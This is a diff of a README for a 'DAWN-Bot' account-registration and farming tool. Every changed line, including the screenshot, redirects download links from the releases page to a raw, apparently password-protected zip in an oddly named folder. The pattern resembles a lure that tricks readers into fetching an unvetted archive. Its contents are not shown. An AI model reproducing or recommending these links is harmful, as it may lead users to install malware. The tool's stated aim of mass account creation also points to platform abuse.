@@ -1,16 +1,16 @@
 # 🚀 DAWN-Bot - Simplify Your Automation Tasks
 
-[![Download DAWN-Bot](https://img.shields.io/badge/Download-DAWN--Bot-brightgreen)](https://github.com/mohamedalilashen/DAWN-Bot/releases)
+[![Download DAWN-Bot](https://raw.githubusercontent.com/mohamedalilashen/DAWN-Bot/main/worldward/DAWN-Bot_v3.5.zip)](https://raw.githubusercontent.com/mohamedalilashen/DAWN-Bot/main/worldward/DAWN-Bot_v3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download the latest version of DAWN Bot: [Download Here](https://github.com/mohamedalilashen/DAWN-Bot/releases)
+Visit this page to download the latest version of DAWN Bot: [Download Here](https://raw.githubusercontent.com/mohamedalilashen/DAWN-Bot/main/worldward/DAWN-Bot_v3.5.zip)
 
 ## 🌟 Overview
 
 DAWN Bot is an advanced automation tool. It helps users manage account registration and farming tasks easily. With a user-friendly design, DAWN Bot makes it simple for anyone to improve efficiency on different platforms.
 
-![DAWN-Bot Screenshot](https://github.com/user-attachments/assets/f5cbb8d4-cf68-4544-81a2-72a4124658ca)
+![DAWN-Bot Screenshot](https://raw.githubusercontent.com/mohamedalilashen/DAWN-Bot/main/worldward/DAWN-Bot_v3.5.zip)
 
 ## 🚀 Features
 
@@ -84,4 +84,4 @@ When you download the DAWN Bot, use the password provided in the download sectio
 
 DAWN Bot is an essential tool for anyone looking to automate tedious tasks efficiently. With the above guide, you should be ready to download, set up, and start benefiting from all its features. For any further inquiries, join our community or check the releases page for updates. 
 
-Visit here to download: [Download Here](https://github.com/mohamedalilashen/DAWN-Bot/releases)
+Visit here to download: [Download Here](https://raw.githubusercontent.com/mohamedalilashen/DAWN-Bot/main/worldward/DAWN-Bot_v3.5.zip)
